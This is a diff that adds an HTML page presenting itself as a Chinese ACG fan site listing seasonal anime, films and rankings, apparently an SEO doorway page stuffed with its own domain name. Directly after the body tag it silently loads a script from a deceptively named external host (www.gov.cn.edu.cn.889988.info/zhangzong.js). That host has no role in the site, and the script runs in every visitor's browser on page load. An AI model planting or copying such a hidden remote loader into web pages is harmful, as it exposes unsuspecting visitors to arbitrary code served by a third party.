@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+<meta name="renderer" content="webkit">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#0b0717">
+<title>宅男电影网 zhainandianyingwang-zh.github.io ｜ 二次元番剧、动漫电影与宅系影视资源整合分享站</title>
+<meta name="keywords" content="宅男电影网,zhainandianyingwang-zh.github.io,宅男影视,二次元番剧,动漫电影,新番放送,宅系电影,acg影视,日漫推荐,宅文化观影">
+<meta name="description" content="宅男电影网（zhainandianyingwang-zh.github.io）是面向二次元与宅文化爱好者的影视资源整合分享站，每周更新当季新番放送表、经典日漫电影回顾、动画剧场版与宅系真人影视推荐。我们专注做一份看得懂、找得到、聊得开的宅圈影视清单，欢迎同好一起补番、一起讨论。">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="author" content="宅男电影网编辑部">
+<meta name="copyright" content="Copyright © 2026 宅男电影网 zhainandianyingwang-zh.github.io">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="canonical" href="https://zhainandianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#0b0717;--bg2:#110a22;--card:#1a102e;--card2:#211540;
+  --line:#342450;--tx:#eeeaff;--tx2:#b6abe0;--tx3:#7d72a8;
+  --neon:#b06cff;--neon2:#21d4fd;--pink:#ff5cad;--lime:#a8ff35;
+  --r:14px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Hiragino Sans GB","PingFang SC","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;
+  background:var(--bg);color:var(--tx);line-height:1.75;overflow-x:hidden;
+  background-image:radial-gradient(circle at 18% 12%,rgba(176,108,255,.16),transparent 42%),radial-gradient(circle at 86% 78%,rgba(33,212,253,.12),transparent 40%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button,input{font:inherit;outline:none;border:none;background:none;color:inherit}
+::selection{background:var(--neon);color:#fff}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+/* ===== status bar ===== */
+.status{position:fixed;top:0;left:0;right:0;z-index:80;background:rgba(11,7,23,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);font-size:12px;color:var(--tx3)}
+.status .wrap{display:flex;justify-content:space-between;height:34px;align-items:center;gap:14px}
+.status .live{display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+.status .dot{width:7px;height:7px;border-radius:50%;background:var(--lime);box-shadow:0 0 10px var(--lime);animation:bl 1.6s infinite}
+@keyframes bl{50%{opacity:.25}}
+.status nav a{color:var(--tx3);transition:.2s}
+.status nav a:hover{color:var(--neon2)}
+
+/* ===== header ===== */
+.head{margin-top:34px;padding:52px 0 34px;text-align:center;position:relative}
+.head .badge{display:inline-block;font-size:11px;letter-spacing:3px;color:var(--neon2);border:1px solid var(--line);border-radius:40px;padding:6px 16px;margin-bottom:22px}
+.head h1{font-size:62px;font-weight:900;letter-spacing:3px;line-height:1.05;text-shadow:0 0 32px rgba(176,108,255,.45)}
+.head h1 .glitch{position:relative;display:inline-block;color:var(--neon)}
+.head h1 .glitch::before,.head h1 .glitch::after{content:attr(data-t);position:absolute;top:0;left:0;opacity:.7}
+.head h1 .glitch::before{color:var(--neon2);transform:translate(-2px,0);clip-path:polygon(0 0,100% 0,100% 45%,0 45%);animation:s 3.2s infinite linear alternate}
+.head h1 .glitch::after{color:var(--pink);transform:translate(2px,0);clip-path:polygon(0 55%,100% 55%,100% 100%,0 100%);animation:s2 2.8s infinite linear alternate}
+@keyframes s{to{transform:translate(-4px,1px)}}
+@keyframes s2{to{transform:translate(4px,-1px)}}
+.head .sub{margin-top:16px;font-size:15px;color:var(--tx2);letter-spacing:1px}
+.head .url{margin-top:14px;font-size:12px;color:var(--tx3);font-family:ui-monospace,Menlo,Consolas,monospace}
+.head .url b{color:var(--neon2);font-weight:600}
+.head .acts{display:flex;gap:12px;justify-content:center;margin-top:26px;flex-wrap:wrap}
+.btn{font-size:14px;font-weight:700;letter-spacing:1px;border-radius:8px;padding:12px 26px;cursor:pointer;transition:.25s;border:1px solid transparent}
+.btn.primary{background:linear-gradient(100deg,var(--neon),var(--pink));color:#fff;box-shadow:0 8px 26px rgba(176,108,255,.35)}
+.btn.primary:hover{transform:translateY(-2px);box-shadow:0 12px 34px rgba(176,108,255,.5)}
+.btn.ghost{color:var(--tx2);border-color:var(--line)}
+.btn.ghost:hover{color:var(--neon2);border-color:var(--neon2)}
+@media(max-width:640px){.head h1{font-size:38px}.head{padding:34px 0 24px}}
+
+/* ===== section ===== */
+.sec{padding:56px 0}
+.sec:first-of-type{padding-top:24px}
+.sh{display:flex;align-items:center;justify-content:space-between;gap:18px;margin-bottom:30px;flex-wrap:wrap}
+.sh .l{display:flex;align-items:center;gap:14px}
+.sh h2{font-size:24px;font-weight:900;letter-spacing:1px}
+.sh .no{font-size:11px;font-weight:800;color:var(--bg);background:var(--neon2);border-radius:5px;padding:4px 9px;letter-spacing:1px}
+.sh .en{font-size:11px;letter-spacing:3px;color:var(--tx3);text-transform:uppercase}
+.sh .more{font-size:12px;color:var(--tx3);border:1px solid var(--line);border-radius:6px;padding:7px 14px;transition:.2s}
+.sh .more:hover{color:var(--neon2);border-color:var(--neon2)}
+
+/* ===== schedule ===== */
+.sched{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
+.sd{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:16px 14px;transition:.25s;cursor:default}
+.sd:hover{border-color:var(--neon);transform:translateY(-3px);background:var(--card2)}
+.sd.today{border-color:var(--pink);background:linear-gradient(160deg,var(--card2),var(--card));box-shadow:0 0 0 1px var(--pink),0 8px 24px rgba(255,92,173,.2)}
+.sd .wk{font-size:11px;color:var(--neon2);font-weight:700;letter-spacing:1px}
+.sd.today .wk{color:var(--pink)}
+.sd h4{font-size:15px;font-weight:800;margin:6px 0 8px}
+.sd ul{display:grid;gap:4px}
+.sd li{font-size:12px;color:var(--tx3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.sd li b{color:var(--lime);font-weight:600}
+
+/* ===== grid ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px}
+.cell{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.cell:hover{border-color:var(--neon);transform:translateY(-4px);box-shadow:0 14px 34px rgba(176,108,255,.22)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden}
+.thumb .g{position:absolute;inset:0;transition:.6s}
+.cell:hover .thumb .g{transform:scale(1.13)}
+.thumb .ep{position:absolute;top:10px;left:10px;font-size:10px;font-weight:800;background:var(--pink);color:#fff;border-radius:4px;padding:3px 8px}
+.thumb .day{position:absolute;top:10px;right:10px;font-size:10px;background:rgba(11,7,23,.82);border:1px solid rgba(255,255,255,.16);color:var(--neon2);border-radius:4px;padding:3px 8px}
+.thumb .fl{position:absolute;left:10px;right:10px;bottom:10px;display:flex;gap:6px}
+.thumb .fl i{font-style:normal;font-size:10px;background:rgba(11,7,23,.86);border:1px solid rgba(255,255,255,.14);color:var(--tx);border-radius:3px;padding:3px 7px}
+.thumb .rt{position:absolute;right:10px;bottom:10px;font-size:16px;font-weight:900;color:var(--lime);text-shadow:0 2px 8px rgba(0,0,0,.6)}
+.body{padding:14px 15px;flex:1;display:flex;flex-direction:column;gap:8px}
+.body h4{font-size:16px;font-weight:800;line-height:1.35}
+.body .st{font-size:12px;color:var(--tx3);flex:1}
+.body .bar{height:3px;border-radius:3px;background:var(--bg2);overflow:hidden}
+.body .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--neon),var(--neon2));border-radius:3px}
+.body .ft{display:flex;justify-content:space-between;font-size:11px;color:var(--tx3)}
+.body .ft b{color:var(--neon2);font-weight:700}
+
+/* ===== marquee chips ===== */
+.chips{display:flex;gap:10px;flex-wrap:wrap}
+.chip{font-size:13px;border:1px solid var(--line);border-radius:8px;padding:9px 15px;transition:.2s;cursor:pointer;color:var(--tx2)}
+.chip:hover,.chip.on{border-color:var(--neon2);color:var(--neon2);background:rgba(33,212,253,.08)}
+
+/* ===== split list ===== */
+.sp{display:grid;grid-template-columns:1.15fr .85fr;gap:44px}
+@media(max-width:860px){.sp{grid-template-columns:1fr;gap:36px}}
+.nl{display:grid;gap:12px}
+.ni{display:grid;grid-template-columns:46px 1fr auto;align-items:center;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px 16px;transition:.25s}
+.ni:hover{border-color:var(--neon);background:var(--card2)}
+.ni .n{width:38px;height:38px;border-radius:9px;display:grid;place-items:center;font-weight:900;color:var(--tx3);background:var(--bg2);font-size:15px}
+.ni:hover .n{background:var(--neon);color:#fff}
+.ni .t h5{font-size:16px;font-weight:800}
+.ni .t p{font-size:12px;color:var(--tx3)}
+.ni .go{font-size:12px;color:var(--tx3);transition:.2s}
+.ni:hover .go{color:var(--neon2)}
+.rankbox{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:20px}
+.rankbox h4{font-size:14px;letter-spacing:2px;color:var(--neon2);margin-bottom:16px}
+.rk{display:grid;gap:12px}
+.rk li{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px dashed var(--line)}
+.rk li:last-child{border:none}
+.rk .p{font-size:15px;font-weight:900;color:var(--neon);width:26px}
+.rk .i{flex:1;min-width:0}
+.rk .i b{display:block;font-size:14px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.rk .i span{font-size:11px;color:var(--tx3)}
+.rk .v{font-size:12px;color:var(--pink);font-weight:700}
+
+/* ===== notice ===== */
+.notice{background:linear-gradient(135deg,var(--card),var(--bg2));border:1px solid var(--line);border-radius:18px;padding:34px;position:relative;overflow:hidden}
+.notice::after{content:"";position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(33,212,253,.25),transparent 70%)}
+.nt{display:grid;grid-template-columns:1fr 1fr;gap:32px;position:relative}
+@media(max-width:720px){.nt{grid-template-columns:1fr}}
+.notice h3{font-size:22px;font-weight:900;margin-bottom:12px}
+.notice h3 em{font-style:normal;color:var(--neon2)}
+.notice p{font-size:14px;color:var(--tx2)}
+.notice ul{display:grid;gap:11px}
+.notice li{display:flex;gap:10px;font-size:14px;color:var(--tx2)}
+.notice li::before{content:"▹";color:var(--neon);font-weight:900;flex:none}
+
+/* ===== footer ===== */
+.foot{background:var(--bg2);border-top:1px solid var(--line);margin-top:40px;padding:48px 0 0}
+.fg{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px;margin-bottom:36px}
+@media(max-width:760px){.fg{grid-template-columns:1fr 1fr;gap:28px}}
+.fb h5{font-size:22px;font-weight:900;letter-spacing:2px;margin-bottom:10px}
+.fb h5 span{color:var(--neon)}
+.fb p{font-size:13px;color:var(--tx3)}
+.fc h6{font-size:11px;letter-spacing:3px;color:var(--neon2);margin-bottom:14px}
+.fc li{margin-bottom:9px}
+.fc a{font-size:13px;color:var(--tx3);transition:.2s}
+.fc a:hover{color:var(--neon2)}
+.copy{border-top:1px solid var(--line);padding:20px 0 34px;font-size:12px;color:var(--tx3)}
+.copy .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.copy b{color:var(--tx2)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="status">
+  <div class="wrap">
+    <div class="live"><span class="dot"></span> 本站持续更新中 · 当季新番放送表已同步 · 共 9 个栏目</div>
+    <nav><a href="#">关于</a> &nbsp;·&nbsp; <a href="#">投稿</a> &nbsp;·&nbsp; <a href="#">RSS</a></nav>
+  </div>
+</div>
+
+<header class="head">
+  <div class="wrap">
+    <span class="badge">ACG · 宅文化 · 影视资源整合站</span>
+    <h1>宅男<span class="glitch" data-t="电影网">电影网</span></h1>
+    <p class="sub">一周七天，每天都有新番，每天都有想补的番</p>
+    <p class="url">官方网站：<b>https://zhainandianyingwang-zh.github.io</b></p>
+    <div class="acts">
+      <a class="btn primary" href="#bangumi">查看当季新番</a>
+      <a class="btn ghost" href="#about">了解本站</a>
+    </div>
+  </div>
+</header>
+
+<section class="sec" id="bangumi">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">01</span><h2>当季新番放送表</h2></div>
+      <a class="more" href="#">完整放送表 →</a>
+    </div>
+    <div class="en" style="font-size:11px;letter-spacing:2px;color:var(--tx3);margin-bottom:18px">WEEKLY BANGUMI SCHEDULE · 2026 秋季番</div>
+    <div class="sched" id="sched"></div>
+  </div>
+</section>
+
+<section class="sec" id="anime">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">02</span><h2>正在热播 · 新番与连载</h2></div>
+      <a class="more" href="#">全部作品 →</a>
+    </div>
+    <div class="grid" id="animeList"></div>
+  </div>
+</section>
+
+<section class="sec" id="movie">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">03</span><h2>动画剧场版与宅系电影</h2></div>
+      <a class="more" href="#">更多电影 →</a>
+    </div>
+    <div class="grid" id="movieList"></div>
+  </div>
+</section>
+
+<section class="sec" id="genre">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">04</span><h2>按题材找番</h2></div>
+      <a class="more" href="#">题材索引 →</a>
+    </div>
+    <div class="chips" id="chips"></div>
+  </div>
+</section>
+
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">05</span><h2>本周热门与编辑部推荐</h2></div>
+    </div>
+    <div class="sp">
+      <div class="nl" id="news"></div>
+      <div class="rankbox">
+        <h4>本周讨论热度 TOP 8</h4>
+        <ul class="rk" id="top"></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="classic">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">06</span><h2>补番清单 · 经典回顾</h2></div>
+      <a class="more" href="#">完整片单 →</a>
+    </div>
+    <div class="grid" id="classicList"></div>
+  </div>
+</section>
+
+<section class="sec" id="about">
+  <div class="wrap">
+    <div class="sh">
+      <div class="l"><span class="no">07</span><h2>关于宅男电影网</h2></div>
+    </div>
+    <div class="notice">
+      <div class="nt">
+        <div>
+          <h3>这里不是播放站，<br>是<em>宅圈同好的一份观影清单</em></h3>
+          <p>宅男电影网（zhainandianyingwang-zh.github.io）由几位 ACG 爱好者共同维护，专注于整理动画新番、剧场版、番外 OVA、宅系真人影视与二次元相关纪录片。我们不提供在线播放服务，只做资源索引与观后讨论，帮助同好更快找到想看的内容。</p>
+        </div>
+        <ul>
+          <li>每周同步当季新番放送时间与更新进度</li>
+          <li>原创番剧短评、剧场版观影记录与题材分类</li>
+          <li>补番清单按题材、年代、完结状态整理</li>
+          <li>本站为个人整理性质，影片信息以官方为准</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot" id="contact">
+  <div class="wrap">
+    <div class="fg">
+      <div class="fb">
+        <h5>宅男<span>电影网</span></h5>
+        <p>zhainandianyingwang-zh.github.io —— 二次元番剧、动漫电影与宅系影视资源整合分享站，欢迎同好一起补番、一起讨论。</p>
+      </div>
+      <div class="fc"><h6>内容栏目</h6><ul>
+        <li><a href="#bangumi">当季新番</a></li><li><a href="#anime">连载番剧</a></li>
+        <li><a href="#movie">动画剧场版</a></li><li><a href="#classic">经典补番</a></li>
+      </ul></div>
+      <div class="fc"><h6>站点信息</h6><ul>
+        <li><a href="#about">关于本站</a></li><li><a href="#">更新说明</a></li>
+        <li><a href="#">投稿与纠错</a></li><li><a href="#">免责声明</a></li>
+      </ul></div>
+      <div class="fc"><h6>找到我们</h6><ul>
+        <li><a href="#">RSS 订阅</a></li><li><a href="#">留言板</a></li>
+        <li><a href="#">友情链接</a></li><li><a href="#">回到顶部</a></li>
+      </ul></div>
+    </div>
+    <div class="copy"><div class="wrap"><span>© 2026 宅男电影网 zhainandianyingwang-zh.github.io · 本站内容为 ACG 爱好者个人整理，影片信息以官方为准 · 保留所有权利</span><span><b>官方网址：https://zhainandianyingwang-zh.github.io</b></span></div></div>
+  </div>
+</footer>
+
+<script>
+const G=[['#b06cff','#5a1fa8'],['#21d4fd','#0b5b8a'],['#ff5cad','#a01a55'],['#a8ff35','#3a7a08'],['#ffb020','#a35f00'],['#ff4d6d','#a01330'],['#38e4b7','#0a7a5c'],['#7b8cff','#28309a'],['#ff8a3d','#a04700'],['#e040fb','#7a0aa0'],['#00e5ff','#007399'],['#c6ff3d','#4a7000']];
+const B=[
+ ['葬送的芙莉莲 第二季','奇幻 · 治愈','ep','剧场版已定档，小说党表示满意','连载中','连载','12'],
+ ['药屋少女的呢喃 第二部','悬疑 · 古风','剧场版','配乐和作画都在线','第 14 集','连载','11'],
+ ['迷宫饭','美食 · 冒险','ep','美食番的天花板，看完会饿','已完结','完结','24'],
+ ['葬送的星之诗','原创 · 科幻','ep','半年番，节奏慢但后劲大','第 03 集','连载','06'],
+ ['吹响！上低音号 第三季','校园 · 音乐','剧场版','京阿尼的稳定发挥','已完结','完结','13'],
+ ['我独自升级 第二季','热血 · 战斗','剧场版','打戏经费在燃烧','第 09 集','连载','12'],
+ ['排球少年!! 垃圾场决战','运动 · 剧场版','剧场版','大银幕上看决胜局太值了','影院热映','剧场版','9.3'],
+ ['葬送的芙莉莲 OVA','奇幻 · OVA','OVA','主线之外的日常也很动人','已发售','OVA','8.7'],
+ ['跃动青春 第二季','校园 · 治愈','ep','看完心情会变好的那种番','第 06 集','连载','11'],
+ ['无职转生 第三季','奇幻 · 冒险','ep','制作水平依旧顶','第 02 集','连载','8.5']
+];
+const M=[
+ ['你的名字。','新海诚','ep','1080P','9.4'],['铃芽之旅','新海诚','ep','4K 修复','9.1'],
+ ['灌篮高手 剧场版','井上雄彦','剧场版','影院版','9.2'],['鬼灭之刃 无限列车','ufotable','剧场版','配音版','9.0'],
+ ['咒术回战 0','MAPPA','剧场版','重看第三遍','8.8'],['间谍过家家 剧场版','WIT','剧场版','一家三口','8.7']
+];
+const C=[
+ ['攻壳机动队 S.A.C.','科幻 · 赛博朋克','ep','26 集全','9.5'],['钢之炼金术师 FA','奇幻 · 冒险','ep','64 集全','9.6'],
+ ['星际牛仔','太空 · 西部','剧场版','26 集全','9.4'],['命运石之门','科幻 · 悬疑','ep','24 集全','9.3'],
+ ['凉宫春日系列','校园 · 科幻','ep','28 集全','8.9'],['魔法少女小圆','魔法 · 悬疑','剧场版','12 集全','9.2']
+];
+const S=['全部','热血战斗','奇幻冒险','校园日常','治愈系','悬疑推理','科幻机战','恋爱喜剧','美食番','运动番','音乐番','原创动画'];
+const WK=[['周一',1,'葬送的芙莉莲 第二季',13,'药屋少女 第二部',14],['周二',0,'我独自升级 第二季',9,'无职转生 第三季',2],['周三',0,'吹响！上低音号 三季',13,'跃动青春 第二季',6],['周四',1,'葬送的星之诗',3,'迷宫饭 OVA',24],['周五',0,'排球少年 剧场版',0,'凉宫春日 重映',0],['周六',0,'鬼灭之刃 柱训练',8,'间谍过家家 二季',12],['周日',0,'钢炼 FA 补番',0,'命运石之门 补番',0]];
+const N=[['当季新番放送表已同步','覆盖 7 天放送安排，含集数与更新时间','12,486'],['《药屋少女》第二部第 14 集简评','配乐这次真的加分了','8,902'],['宅男电影网 2026 秋季番推荐清单','编辑部投出来的前十名','7,315'],['《我独自升级》第二季打戏复盘','分镜和作画值得单独写','6,740'],['经典补番：钢之炼金术师 FA','为什么十年后它还是神作','5,928']];
+const T=[['葬送的芙莉莲 第二季',15420],['药屋少女的呢喃 第二部',12880],['我独自升级 第二季',11650],['迷宫饭',9820],['吹响！上低音号 三季',8760],['跃动青春 第二季',7430],['无职转生 第三季',6910],['葬送的星之诗',5270]];
+function card(o){const[c1,c2]=G[o.i%G.length];return `<article class="cell"><div class="thumb"><div class="g" style="background:linear-gradient(155deg,${c1},${c2})"></div><span class="ep">${o[2]==='剧场版'?'剧场版':o[2]==='OVA'?'OVA':'连载'}</span><span class="day">${o[3].includes('映')||o[2]==='剧场版'?'影院':o[4]}</span><div class="fl"><i>${o[1].split(' · ')[0]}</i><i>${o[1].split(' · ')[1]}</i></div></div><div class="body"><h4>${o[0]}</h4><p class="st">${o[3]}</p><div class="bar"><i style="width:${o[5]==='剧场版'?100:o[5]==='完结'?100:o[5]==='OVA'?70:Math.min(100,parseInt(o[4].replace(/[^0-9]/g,''))||20)*6}%"></i></div><div class="ft"><span><b>${o[2]==='剧场版'?'影院热映':o[4]}</b></span><span>${o[2]}</span></div></div></article>`}
+document.getElementById('animeList').innerHTML=B.map((m,i)=>{m.i=i;return card(m)}).join('');
+document.getElementById('movieList').innerHTML=M.map((m,i)=>{m.i=i+4;m[5]=m[4];return card(m)}).join('');
+document.getElementById('classicList').innerHTML=C.map((m,i)=>{m.i=i+8;m[2]='ep';m[3]='经典回顾';m[4]=m[3].split(' ')[0];m[5]='完结';return card(m)}).join('');
+document.getElementById('chips').innerHTML=S.map((s,i)=>`<a class="chip${i===0?' on':''}" href="#">${s}</a>`).join('');
+document.getElementById('sched').innerHTML=WK.map(w=>{const live=w[1]===1;return `<div class="sd${live?' today':''}"><div class="wk">${live?'今日放送 · ':''}${w[0]}</div><h4>${w[2]}</h4><ul><li><b>${w[3]}</b></li><li>${w[4]}（第 ${w[5]} 集）</li></ul></div>`}).join('');
+document.getElementById('news').innerHTML=N.map((n,i)=>`<a class="ni" href="#"><span class="n">${String(i+1).padStart(2,'0')}</span><span class="t"><h5>${n[0]}</h5><p>${n[1]}</p></span><span class="go">阅读 →</span></a>`).join('');
+document.getElementById('top').innerHTML=T.map((t,i)=>`<li><span class="p">${i+1}</span><span class="i"><b>${t[0]}</b><span>当季新番 · 编辑部关注</span></span><span class="v">${t[1].toLocaleString()}</span></li>`).join('');
+</script>
+</body>
+</html>
